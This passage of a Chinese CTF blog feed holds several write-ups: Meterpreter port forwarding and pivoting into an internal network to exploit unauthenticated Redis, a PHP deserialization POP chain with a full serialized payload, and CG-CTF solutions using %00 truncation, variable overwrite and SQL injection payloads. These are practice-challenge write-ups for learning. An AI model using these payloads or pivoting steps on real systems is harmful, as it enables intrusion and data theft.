&lt;h4 id=&#34;meterpreter基本隧道代理&#34;&gt;&lt;strong&gt;meterpreter基本隧道代理&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/sectool/56432.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;&amp;raquo;学习连接&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&#34;1portfwd&#34;&gt;1.portfwd&lt;/h4&gt;
&lt;p&gt;portfwd 是meterpreter提供的一种基本的端口转发。porfwd可以反弹单个端口到本地，并且监听.使用方法如下:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; portfwd 
0 total local port forwards.
meterpreter &amp;gt; portfwd  -h
Usage: portfwd [-h] [add | delete | list | flush] [args]
OPTIONS:
    -L &amp;lt;opt&amp;gt;  The local host to listen on (optional).
    -h        Help banner.
    -l &amp;lt;opt&amp;gt;  The local port to listen on.
    -p &amp;lt;opt&amp;gt;  The remote port to connect to.
    -r &amp;lt;opt&amp;gt;  The remote host to connect to.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用实例介绍：&lt;/p&gt;
&lt;p&gt;反弹10.1.1.129端口3389到本地2222并监听那么可以使用如下方法：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;meterpreter &amp;gt; portfwd add -l 2222 -r 10.1.1.129 -p 3389
[*] Local TCP relay created: 0.0.0.0:2222 &amp;lt;-&amp;gt; 10.1.1.129:3389
meterpreter &amp;gt; portfwd 
0: 0.0.0.0:2222 -&amp;gt; 10.1.1.129:3389
1 total local port forwards.
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;2-pivot&#34;&gt;2. pivot&lt;/h4&gt;
&lt;p&gt;pivot是meterpreter最常用的一种代理，可以轻松把你的机器代理到受害者内网环境，下面介绍下pivot的搭建和使用方法&lt;/p&gt;
&lt;p&gt;使用方法&lt;code&gt;route add 目标ip或ip段 子网掩码 session序号&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;要使用代理的会话，通过实例来说明：&lt;/p&gt;
&lt;p&gt;在metasploit添加一个路由表，目的是访问10.1.1.129将通过meterpreter的会话 1 来访问：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msf exploit(handler) &amp;gt; route add 10.1.1.129 255.255.255.255 1
[*] Route added
msf exploit(handler) &amp;gt; route print 
Active Routing Table
====================
   Subnet             Netmask            Gateway
   ------             -------            -------
   10.1.1.129         255.255.255.255    Session 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里如果要代理10.1.1.129/24 到session 1，则可以这么写：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;route add 10.1.1.0 255.255.255.0 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;到这里pivot已经配置好了，你在msf里对10.1.1.129进行扫描(db_nmap)或者访问(psexe 模块，ssh模块等)将通过代理session 1这个会话来访问。&lt;/p&gt;
&lt;p&gt;但是如果想通过其他应用程序来使用这个代理怎么办呢？&lt;/p&gt;
&lt;p&gt;这时候可以借助 metasploit socks4a提供一个监听隧道供其他应用程序访问：&lt;/p&gt;
&lt;p&gt;首先使用 socks4a并且配置，监听端口：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msf exploit(handler) &amp;gt; use auxiliary/server/socks4a 
msf auxiliary(socks4a) &amp;gt; show options 
Module options (auxiliary/server/socks4a):
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  1080             yes       The port to listen on.
Auxiliary action:
   Name   Description
   ----   -----------
   Proxy  
msf auxiliary(socks4a) &amp;gt; exploit -y
[*] Auxiliary module execution completed
msf auxiliary(socks4a) &amp;gt; 
[*] Starting the socks4a proxy server
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看监听端口：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@kali:~# netstat -an | grep &amp;quot;1080&amp;quot;
tcp        0      0 0.0.0.0:1080            0.0.0.0:*               LISTEN
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;端口已经监听，接着配置 proxychains&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;root@kali:~# vim /etc/proxychains.conf
[ProxyList]
# add proxy here ...
# meanwileroot@kali:~# netstat -an | grep &amp;quot;1080&amp;quot;
tcp        0      0 0.0.0.0:1080            0.0.0.0:*               LISTEN 
# defaults set to &amp;quot;tor&amp;quot;
socks4  127.0.0.1 1080
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;完成之后我们在命令前面加上&lt;code&gt;proxychain&lt;/code&gt;就可以正常的用本机的工具扫描内网了&lt;/p&gt;
&lt;p&gt;至于高端的二级代理甚至多级代理就不谈了。&lt;/p&gt;
&lt;p&gt;这里我只进行了第一步，用了msf里面的&lt;code&gt;portscan&lt;/code&gt;扫描了内网&lt;code&gt;10.0.0.3&lt;/code&gt;主机的端口，发现只有&lt;code&gt;6379&lt;/code&gt;端口开放，网上查阅资料后得知是redis的端口，于是我用了msf里面的几个模块进行了尝试，其中，使用redis_login（用于爆破登录密码）的时候，msf提示我这个端口并没有设置密码，也就是存在&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/vuls/162035.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;redis未授权访问漏洞&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;于是我把&lt;code&gt;6379&lt;/code&gt;端口映射到了本地的&lt;code&gt;10086&lt;/code&gt;，通过本地的&lt;code&gt;redis&lt;/code&gt;客户端进行了访问&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;redis-cli -h 127.0.0.1 -p 10086
127.0.0.1:10086&amp;gt;
127.0.0.1:10086&amp;gt;keys *
1) &amp;quot;welcome&amp;quot;
127.0.0.1:10086&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功了！！！一阵狂喜过后写了几个键，装了个B，开始尝试利用漏洞。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/qq_27446553/article/details/78096385?depth_1-utm_source=distribute.pc_relevant.none-task&amp;amp;utm_source=distribute.pc_relevant.none-task&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;&amp;raquo;redis漏洞深度利用&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;一般来讲，网上的几种方法：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(1).利用计划任务执行命令反弹shell

(2).写ssh-keygen公钥然后使用私钥登陆

(3).往web物理路径写webshell
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但是我们需要注意的是，&lt;code&gt;(1)&lt;/code&gt;需要&lt;code&gt;/var/spool/cron/&lt;/code&gt;路径存在并且有权限，&lt;code&gt;(2)&lt;/code&gt;需要&lt;code&gt;22端口&lt;/code&gt;开放，&lt;code&gt;(3)&lt;/code&gt;需要&lt;code&gt;80端口&lt;/code&gt;开放并且启动了web服务。&lt;/p&gt;
&lt;p&gt;显然学长没给弹shell的机会，&lt;code&gt;/var/spool/cron/&lt;/code&gt;目录根本不存在其他两个端口都没开就不谈了。。。&lt;/p&gt;
&lt;p&gt;不过有趣的是，我利用了&lt;code&gt;redis&lt;/code&gt;的&lt;code&gt;config set dir /flag&lt;/code&gt;摸清楚了flag在根目录，不过没有找到什么姿势可以让redis直接读取系统文件的。&lt;/p&gt;
&lt;p&gt;后来看到了redis的一个主从机制，也没有往那方面想，于是本题宣告白给。&lt;/p&gt;
&lt;p&gt;wakawaka师傅（最nb的男人）用redis的主从复制漏洞搞了一发，没成功，问学长说是环境问题，给通过了。&lt;/p&gt;
&lt;p&gt;WP在这里就结束了，redis的主从复制漏洞改日在本地复现之后再更。&lt;/p&gt;
&lt;p&gt;更新：&lt;/p&gt;
&lt;p&gt;原理可以百度，这里直接本地用Github上面的&lt;code&gt;redis-rogue-getshell-master&lt;/code&gt;打通，本地的&lt;a class=&#34;link&#34; href=&#34;https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/poc%26tool/redis-rogue-getshell-master.zip&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;exp&lt;/a&gt;打docker:（本地不需要redis客户端）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;python3 redis-master.py -r 目标ip -p 目标端口 -L 本机ip -P 本机端口 -f 使用的exp -c 要执行的命令
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164820.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>由MRCTF2020学习反序列化POP链</title>
        <link>https://anthem-whisper.github.io/p/%E7%94%B1mrctf2020%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/</link>
        <pubDate>Sun, 29 Mar 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/%E7%94%B1mrctf2020%E5%AD%A6%E4%B9%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/</guid>
        <description>&lt;p&gt;复现地址：&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[MRCTF2020]Ezpop&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;BUUOJ&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;打开题目即送源码：&lt;a class=&#34;link&#34; href=&#34;https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/MRCTF2020/MRCTF_ezpop.zip&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;MRCTF_ezpop&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;先说PHP的一些魔术方法：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;__wakeup() //使用unserialize时触发
__sleep() //使用serialize时触发
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问（或不存在）的属性读取数据
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当尝试将对象调用为函数时触发
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;有了这些知识后，我们再来分析源码；&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Welcome to index.php
&amp;lt;?php
//flag is in flag.php
//WTF IS THIS?
//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5
%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95
//And Crack It!
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this-&amp;gt;append($this-&amp;gt;var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file=&#39;index.php&#39;){
        $this-&amp;gt;source = $file;
        echo &#39;Welcome to &#39;.$this-&amp;gt;source.&amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
    }
    public function __toString(){
        return $this-&amp;gt;str-&amp;gt;source;
    }

    public function __wakeup(){
        if(preg_match(&amp;quot;/gopher|http|file|ftp|https|dict|\.\./i&amp;quot;, $this-&amp;gt;source)) {
            echo &amp;quot;hacker&amp;quot;;
            $this-&amp;gt;source = &amp;quot;index.php&amp;quot;;
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this-&amp;gt;p = array();
    }

    public function __get($key){
        $function = $this-&amp;gt;p;
        return $function();
    }
}

if(isset($_GET[&#39;pop&#39;])){
    @unserialize($_GET[&#39;pop&#39;]);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们可以看到，在&lt;code&gt;Modifier&lt;/code&gt;类里面有一个include函数，可以通过这个包含flag.php&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this-&amp;gt;append($this-&amp;gt;var);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当我们尝试将对象调用为函数时，&lt;code&gt;__invoke()&lt;/code&gt;就会自动包含 &lt;code&gt;$var&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;所以，我们又看到了&lt;code&gt;Test&lt;/code&gt;类里面：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;class Test{
    public $p;
    public function __construct(){
        $this-&amp;gt;p = array();
    }

    public function __get($key){
        $function = $this-&amp;gt;p;
        return $function();
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当我们访问&lt;code&gt;Test&lt;/code&gt;类里面一个不可见或者不存在的属性时，&lt;code&gt;__get()&lt;/code&gt;自动以函数的方式调用&lt;code&gt;$p&lt;/code&gt;;&lt;/p&gt;
&lt;p&gt;那么，源码里面那里能够访问一个属性呢？&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Show&lt;/code&gt;类：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;class Show{
    public $source;
    public $str;
    public function __construct($file=&#39;index.php&#39;){
        $this-&amp;gt;source = $file;
        echo &#39;Welcome to &#39;.$this-&amp;gt;source.&amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
    }
    public function __toString(){
        return $this-&amp;gt;str-&amp;gt;source;
    }

    public function __wakeup(){
        if(preg_match(&amp;quot;/gopher|http|file|ftp|https|dict|\.\./i&amp;quot;, $this-&amp;gt;source)) {
            echo &amp;quot;hacker&amp;quot;;
            $this-&amp;gt;source = &amp;quot;index.php&amp;quot;;
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;它可以访问自身属性&lt;code&gt;str&lt;/code&gt;的成员&lt;code&gt;source&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果我们把&lt;code&gt;str&lt;/code&gt;属性new一个&lt;code&gt;Test&lt;/code&gt;，但是Test里面并没有source属性，&lt;/p&gt;
&lt;p&gt;那么我们new的Test就会以函数的方式调用&lt;code&gt;$p&lt;/code&gt;那么如果&lt;code&gt;$p&lt;/code&gt;又是一个&lt;code&gt;Modifier&lt;/code&gt;类，就会自动包含$var指向的页面。&lt;/p&gt;
&lt;p&gt;所以，我们构造的思路是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$poc = new Show; 
$poc-&amp;gt;source = new Show; 
$poc-&amp;gt;source-&amp;gt;str = new Test; 
$poc-&amp;gt;source-&amp;gt;str-&amp;gt;p = new Modifier;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;playload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
class Modifier {
    protected  $var = &#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this-&amp;gt;append($this-&amp;gt;var);
    }
}

class Show{
    public $source;
    public $str;
    public function __toString(){
        return $this-&amp;gt;str-&amp;gt;source;
    }

    public function __wakeup(){
        if(preg_match(&amp;quot;/gopher|http|file|ftp|https|dict|\.\./i&amp;quot;, $this-&amp;gt;source)) {
            echo &amp;quot;hacker&amp;quot;;
            $this-&amp;gt;source = &amp;quot;index.php&amp;quot;;
        }
    }
}

class Test{
    public $p;

    public function __get($key){
        $function = $this-&amp;gt;p;
        return $function();
    }
}

$poc = new Show;
$poc-&amp;gt;source = new Show;
$poc-&amp;gt;source-&amp;gt;str = new Test;
$poc-&amp;gt;source-&amp;gt;str-&amp;gt;p = new Modifier;
echo serialize($poc);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;解释一下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$poc-&amp;gt;source = new Show;
//为什么要new show两次？
//触发__toString()，source被第一层show当作字符串，于是访问source-&amp;gt;str-&amp;gt;source,也就是Test里面的source(不存在)，触发__get
$poc-&amp;gt;source-&amp;gt;str = new Test;
//$poc-&amp;gt;source-&amp;gt;str-&amp;gt;source（Test-&amp;gt;source）不存在，触发__get
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行脚本，得到：（注意：Modifier类的protect属性注入需要加%00）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;O:4:&amp;quot;Show&amp;quot;:2:{s:6:&amp;quot;source&amp;quot;;O:4:&amp;quot;Show&amp;quot;:2:{s:6:&amp;quot;source&amp;quot;;N;s:3:&amp;quot;str&amp;quot;;O:4:&amp;quot;Test&amp;quot;:1:{s:1:&amp;quot;p&amp;quot;;O:8:&amp;quot;Modifier&amp;quot;:1:{s:6:&amp;quot;%00*%00var&amp;quot;;s:57:&amp;quot;php://filter/read=convert.base64-encode/resource=flag.php&amp;quot;;}}}s:3:&amp;quot;str&amp;quot;;N;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;GET传值即获flag.php&lt;/p&gt;
&lt;p&gt;MRCTF{1892c0f7-3c71-431f-a991-7414ca1ea339}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>CG-CTF_wp</title>
        <link>https://anthem-whisper.github.io/p/cg-ctf_wp/</link>
        <pubDate>Sun, 02 Feb 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/cg-ctf_wp/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120164539.jpeg&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;cgctf不得不说是一个很棒的学习平台，这里有我写的部分wp：&lt;/p&gt;
&lt;h3 id=&#34;0x00httpteamxlcsinaappcomweb4f5a14f5e6e3453b78cd73899bad98d53indexphp&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;\0x00&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：%00截断（ereg函数的截断漏洞）、数组绕过（ereg函数的另一个漏洞）&lt;/p&gt;
&lt;p&gt;题目直接给源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;view-source:
    if (isset ($_GET[&#39;nctf&#39;])) {
        if (@ereg (&amp;quot;^[1-9]+$&amp;quot;, $_GET[&#39;nctf&#39;]) === FALSE)
            echo &#39;必须输入数字才行&#39;;
        else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !== FALSE)   
            die(&#39;Flag: &#39;.$flag);
        else
            echo &#39;骚年，继续努力吧啊~&#39;;
    }
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;这里ereg有两个漏洞：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;①%00截断及遇到%00则默认为字符串的结束&lt;/p&gt;
&lt;p&gt;②当ntf为数组时它的返回值不是FALSE&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;法一：数组绕过
index.php?nctf[]=#biubiubiu
法二：\x00截断
index.php?nctf=1%00%23biubiubiu
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;nctf{use_00_to_jieduan}&lt;/p&gt;
&lt;h3 id=&#34;php-反序列化暂时无法做http4chinaloversinaappcomweb25indexphp&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;http://4.chinalover.sinaapp.com/web25/index.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;php 反序列化(暂时无法做)&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：对象包含的引用在序列化时也会被存储&lt;/p&gt;
&lt;p&gt;题目源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
class just4fun {
    var $enter;
    var $secret;
}

if (isset($_GET[&#39;pass&#39;])) {
    $pass = $_GET[&#39;pass&#39;];
    
    if(get_magic_quotes_gpc()){
        $pass=stripslashes($pass);
    }
    
    $o = unserialize($pass);
    
    if ($o) {
        $o-&amp;gt;secret = &amp;quot;*&amp;quot;;
        if ($o-&amp;gt;secret === $o-&amp;gt;enter)
            echo &amp;quot;Congratulation! Here is my secret: &amp;quot;.$o-&amp;gt;secret;
        else 
            echo &amp;quot;Oh no... You can&#39;t fool me&amp;quot;;
    }
    else echo &amp;quot;are you trolling?&amp;quot;;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;反序列化后，secret会被重新赋值为一个未知的值，但要求enter跟secret的值一致才能拿到flag。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对象包含的引用在序列化时也会被存储&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;编写脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
class just4fun {
    var $enter;
    var $secret;
}

$a= new just4fun;

$a-&amp;gt;enter=&amp;amp;$a-&amp;gt;secret;

echo serialize($a);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;执行得到：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;O:8:&amp;quot;just4fun&amp;quot;:2:{s:5:&amp;quot;enter&amp;quot;;N;s:6:&amp;quot;secret&amp;quot;;R:2;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;GET传值过去：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://4.chinalover.sinaapp.com/web25/index.php?pass=O:8:%22just4fun%22:2:{s:5:%22enter%22;N;s:6:%22secret%22;R:2;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Congratulation! Here is my secret: thisisnctfsecret
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;变量覆盖httpchinaloversinaappcomweb18&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;http://chinalover.sinaapp.com/web18/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;变量覆盖&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：变量覆盖漏洞&lt;/p&gt;
&lt;p&gt;题目关键部分源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php if ($_SERVER[&amp;quot;REQUEST_METHOD&amp;quot;] == &amp;quot;POST&amp;quot;) { ?&amp;gt;
                        &amp;lt;?php
                        extract($_POST);
                        if ($pass == $thepassword_123) { ?&amp;gt;
                            &amp;lt;div class=&amp;quot;alert alert-success&amp;quot;&amp;gt;
                                &amp;lt;code&amp;gt;&amp;lt;?php echo $theflag; ?&amp;gt;&amp;lt;/code&amp;gt;
                            &amp;lt;/div&amp;gt;
                        &amp;lt;?php } ?&amp;gt;
&amp;lt;?php } ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;整理为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php

if ($_SERVER[&amp;quot;REQUEST_METHOD&amp;quot;] == &amp;quot;POST&amp;quot;) {
                        extract($_POST);
                        if ($pass == $thepassword_123) {
                             echo $theflag;
                        }
}

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;变量覆盖漏洞大多数由函数使用不当导致，经常引发变量覆盖漏洞的函数有：extract(), parse_str() 和 import_request_variables()&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;extract()变量覆盖&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php

$auth = &#39;0&#39;;
extract($_GET)；

if($auth==1){
echo &amp;quot;private!&amp;quot;;
}else{
echo &amp;quot;public!&amp;quot;;
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;假设用户构造以下链接：http://www.a.com/test1.php?auth=1&lt;/p&gt;
&lt;p&gt;则站点会输出“private！”&lt;/p&gt;
&lt;p&gt;所以playload是：（burp suite数据包）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /web18/ HTTP/1.1
Host: chinalover.sinaapp.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://chinalover.sinaapp.com
Connection: close
Referer: http://chinalover.sinaapp.com/web18/index.php
Upgrade-Insecure-Requests: 1

pass=1&amp;amp;thepassword_123=1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;nctf{bian_liang_fu_gai!}&lt;/p&gt;
&lt;h3 id=&#34;变量覆盖2httpchinaloversinaappcomweb24&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;http://chinalover.sinaapp.com/web24/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;变量覆盖2&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：遍历初始化变量导致变量覆盖&lt;/p&gt;
&lt;p&gt;题目源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!--
foreach($_GET as $key =&amp;gt; $value){  
        $$key = $value;  
}  
if($name == &amp;quot;meizijiu233&amp;quot;){
    echo $flag;
}
--&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;（详见本站“&lt;a class=&#34;link&#34; href=&#34;http://wh1sper.com/%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96%e6%bc%8f%e6%b4%9e%e5%ad%a6%e4%b9%a0%e7%ac%94%e8%ae%b0/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;变量覆盖漏洞学习笔记&lt;/a&gt;”）&lt;/p&gt;
&lt;p&gt;playload:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chinalover.sinaapp.com/web24/?name=meizijiu233
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;nctf{AD3FBD8D5928693CA499347C91570AE6}&lt;/p&gt;
&lt;h3 id=&#34;sql-injectionhttpchinaloversinaappcomweb15indexphp&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;http://chinalover.sinaapp.com/web15/index.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;SQL Injection&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;知识点：PHP代码审计，sql语言基础，\转义单引号&lt;/p&gt;
&lt;p&gt;题目：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!--
#GOAL: login as admin,then get the flag;
error_reporting(0);
require &#39;db.inc.php&#39;;

function clean($str){
	if(get_magic_quotes_gpc()){
		$str=stripslashes($str);
	}
	return htmlentities($str, ENT_QUOTES);
}

$username = @clean((string)$_GET[&#39;username&#39;]);
$password = @clean((string)$_GET[&#39;password&#39;]);

$query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;;
$result=mysql_query($query);
if(!$result || mysql_num_rows($result) &amp;lt; 1){
	die(&#39;Invalid password!&#39;);
}

echo $flag;
--&amp;gt;
Invalid password!
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;代码中clean()函数去掉转义，htmlentities($str, ENT_QUOTES)会转换单引号和双引号。这里我们只能通过&lt;strong&gt;引入反斜杠&lt;/strong&gt;，&lt;strong&gt;转义原有的单引号&lt;/strong&gt;，改变原sql语句的逻辑，导致sql注入。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;payload如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?username=\&amp;amp;password= or 1#//要urlcode编码一下，不然#会被浏览器当作空字符
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;于是sql查询语句为：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SELECT * FROM users WHERE
name=&#39;\&#39; AND pass=&#39;            //此时，\&#39;已被转义为一个字符，不会起到引号的作用
or 1
#&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;flag:nctf{sql_injection_is_interesting}&lt;/p&gt;
&lt;h3 id=&#34;sql注入2http4chinaloversinaappcomweb6indexphp&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;http://4.chinalover.sinaapp.com/web6/index.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;SQL注入2&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：union查询，union查询的时候，返回的结果的列名个第一条查询语句是相同的&lt;/p&gt;
&lt;h4 id=&#34;sql-union-语法&#34;&gt;SQL UNION 语法&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;SELECT column_name(s) FROM table_name1
UNION
SELECT column_name(s) FROM table_name2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果要查询重复的值，可以使用 UNION ALL：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SELECT column_name(s) FROM table_name1
UNION ALL
SELECT column_name(s) FROM table_name2
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;实例&#34;&gt;实例&lt;/h4&gt;
&lt;p&gt;列出所有在中国和美国的不同的雇员名：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;SELECT E_Name FROM Employees_China
UNION
SELECT E_Name FROM Employees_USA
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;结果&#34;&gt;结果&lt;/h4&gt;
